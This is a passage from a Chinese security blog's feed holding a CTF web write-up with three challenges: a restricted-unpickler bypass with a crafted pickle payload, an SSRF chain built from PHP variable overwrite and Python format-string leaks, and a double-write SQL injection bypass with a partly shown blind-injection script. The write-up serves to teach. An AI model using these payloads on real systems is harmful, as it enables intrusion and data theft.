&lt;h1 id=&quot;file-put-contents-filename-”-lt-php-exit-”-content&quot;&gt;&lt;a href=&quot;#file-put-contents-filename-”-lt-php-exit-”-content&quot; class=&quot;headerlink&quot; title=&quot;file_put_contents($filename,”&amp;lt;?php exit();”.$content);&quot;&gt;&lt;/a&gt;file_put_contents($filename,”&amp;lt;?php exit();”.$content);&lt;/h1&gt;
    
    </summary>
    
    
      <category term="Cyc1e的漏洞分析之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="file_put_contents" scheme="https://cyc1e183.github.io/tags/file-put-contents/"/>
    
      <category term="php://filter" scheme="https://cyc1e183.github.io/tags/php-filter/"/>
    
  </entry>
  
  <entry>
    <title>GXZYCTF部分Web Writeup</title>
    <link href="https://cyc1e183.github.io/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/"/>
    <id>https://cyc1e183.github.io/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-04-03T09:04:40.378Z</updated>
    
    <content type="html"><![CDATA[<p><strong>很长一段时间没有接触了，都沉迷于课程学习不能自拔（被迫的），果然2020年对题目都失去了感觉，不仅如此，刚打开就想x了……，简单先整理一下做出来的题。</strong></p><h3 id="0x00-Webtmp"><a href="#0x00-Webtmp" class="headerlink" title="0x00 Webtmp"></a>0x00 Webtmp</h3><p>题目源码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="constructor">Flask(<span class="params">__name__</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Animal:</span><br><span class="line">    def <span class="constructor">__init__(<span class="params">self</span>, <span class="params">name</span>, <span class="params">category</span>)</span>:</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__repr__(<span class="params">self</span>)</span>:</span><br><span class="line">        return f'<span class="constructor">Animal(<span class="params">name</span>=&#123;<span class="params">self</span>.<span class="params">name</span>!<span class="params">r</span>&#125;, <span class="params">category</span>=&#123;<span class="params">self</span>.<span class="params">category</span>!<span class="params">r</span>&#125;)</span>'</span><br><span class="line"></span><br><span class="line">    def <span class="constructor">__eq__(<span class="params">self</span>, <span class="params">other</span>)</span>:</span><br><span class="line">        return <span class="keyword">type</span>(other) is Animal <span class="keyword">and</span> self.name<span class="operator"> == </span>other.name <span class="keyword">and</span> self.category<span class="operator"> == </span>other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="constructor">RestrictedUnpickler(<span class="params">pickle</span>.Unpickler)</span>:</span><br><span class="line">    def find<span class="constructor">_class(<span class="params">self</span>, <span class="params">module</span>, <span class="params">name</span>)</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">module</span><span class="operator"> == </span>'__main__':</span><br><span class="line">            return getattr(sys.modules<span class="literal">['<span class="identifier">__main__</span>']</span>, name)</span><br><span class="line">        raise pickle.<span class="constructor">UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (<span class="params">module</span>, <span class="params">name</span>)</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted<span class="constructor">_loads(<span class="params">s</span>)</span>:</span><br><span class="line">    return <span class="constructor">RestrictedUnpickler(<span class="params">io</span>.BytesIO(<span class="params">s</span>)</span>).load<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read(filename, encoding='utf-<span class="number">8</span>'):</span><br><span class="line">    <span class="keyword">with</span> <span class="keyword">open</span>(filename, <span class="character">'r'</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        return fin.read<span class="literal">()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="character">'/'</span>, methods=<span class="literal">['GET', 'POST']</span>)</span><br><span class="line">def index<span class="literal">()</span>:</span><br><span class="line">    <span class="keyword">if</span> request.args.get('source'):</span><br><span class="line">        return <span class="constructor">Response(<span class="params">read</span>(<span class="params">__file__</span>)</span>, mimetype='text/plain')</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.<span class="keyword">method</span><span class="operator"> == </span>'POST':</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get('data')</span><br><span class="line">            <span class="keyword">if</span> b<span class="character">'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters <span class="keyword">or</span> RCEs.'</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted<span class="constructor">_loads(<span class="params">base64</span>.<span class="params">b64decode</span>(<span class="params">pickle_data</span>)</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">type</span>(result) is not Animal:</span><br><span class="line">                    return 'Are you sure that is an animal???'</span><br><span class="line">            correct = (result<span class="operator"> == </span><span class="constructor">Animal(<span class="params">secret</span>.<span class="params">name</span>, <span class="params">secret</span>.<span class="params">category</span>)</span>)</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">unpickle_result</span>.<span class="params">html</span>', <span class="params">result</span>=<span class="params">result</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>, <span class="params">giveflag</span>=<span class="params">correct</span>)</span></span><br><span class="line">        except Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            return <span class="string">"Something wrong"</span></span><br><span class="line"></span><br><span class="line">    sample_obj = <span class="constructor">Animal('一给我哩<span class="params">giaogiao</span>', 'Giao')</span></span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode<span class="literal">()</span></span><br><span class="line">    return render<span class="constructor">_template('<span class="params">unpickle_page</span>.<span class="params">html</span>', <span class="params">sample_obj</span>=<span class="params">sample_obj</span>, <span class="params">pickle_data</span>=<span class="params">pickle_data</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__<span class="operator"> == </span>'__main__':</span><br><span class="line">    app.run(host='<span class="number">0.0</span>.<span class="number">0.0</span>', port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>很明显一道python反序列化的题，不过<code>if b&#39;R&#39; in base64.b64decode(pickle_data)</code>断了直接反弹shell和调用render_template函数的操作，所以说就是只能给secret.name、secret.category变量赋值，要求type为Animal，同时secret又要重main启动，所以需要重写一下secret类。参考<a href="https://blog.init-new-world.com/post/hitctf-train.html（也就是原题）" target="_blank" rel="noopener">https://blog.init-new-world.com/post/hitctf-train.html（也就是原题）</a></p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309103404408.png" alt></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Cyc1e</span><br><span class="line"># @Date:   2020-03-07 14:51:06</span><br><span class="line"># @Last Modified by:   Cyc1e</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">payload = b"<span class="symbol">\x</span>80<span class="symbol">\x</span>03c__main__<span class="symbol">\n</span>secret<span class="symbol">\n</span>&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub0c__main__<span class="symbol">\n</span>Animal<span class="symbol">\n</span>)<span class="symbol">\x</span>81&#125;q<span class="symbol">\x</span>02(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>05<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00kittyq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>03<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00catq<span class="symbol">\x</span>06ub."</span><br><span class="line">print(base64.b64encode(payload).decode())</span><br></pre></td></tr></table></figure><h3 id="0x01-fmkq"><a href="#0x01-fmkq" class="headerlink" title="0x01 fmkq"></a>0x01 fmkq</h3><p>访问直接给了题目源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>关键就是触发curl了，参考<a href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> 通过extract进行变量覆盖，覆盖begin为begin=%1$s，则<code>sprintf($begin.&#39;%d&#39;,$output);</code>处就可以输出，例如构造</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure><p>则可以返回baidu的内容，所以显然用来SSRF最合适不过，发现127.0.0.1还开了8080端口，所以构造</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309104345436.png" alt></p><p>也就是需要我们拿到vipcode，一通测试，python的格式化字符串问题，构造</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure><p>可以读取到vipcode</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105152178.png" alt></p><p>带上vipcode就可以为所欲为了</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/image-20200309105248654.png" alt></p><p>提示了flag所在的文件，结合题目提示，flag的路径就是/fl4g_1s_h3re_u_wi11_rua/flag，读取题目源码可以发现fl4g被过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure><p>由于fl4g被过滤了，所以只能另辟蹊径，代码中</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure><p>所以可以通过current_folder_file来获取flag文件夹，构造</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0.png" alt>            </p><h3 id="0x02-nweb"><a href="#0x02-nweb" class="headerlink" title="0x02 nweb"></a>0x02 nweb</h3><p>根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722768764.png" alt>            </p><p>type赋值为110，登录后可以访问flag.php 里面是一个search框，可以测试一下注入</p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722779047.png" alt="img">            </p><p><img src="/2020/03/09/GXZYCTF%E9%83%A8%E5%88%86Web-Writeup/0-1583722789446.png" alt="img">            </p><p>简单测试发现只过滤了select和from，可以双写绕过，所以写一个脚本跑就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag= <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://121.37.179.47:1001/search.php'</span></span><br><span class="line">Cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'huiulsnkb5bpm59h6v38o1qlv1;'</span>,</span><br><span class="line">          <span class="string">'username'</span>:<span class="string">'41fcba09f2bdcdf315ba4119dc7978dd'</span>&#125;</span><br><span class="line">proxies = &#123;</span><br><span class="line">        <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span 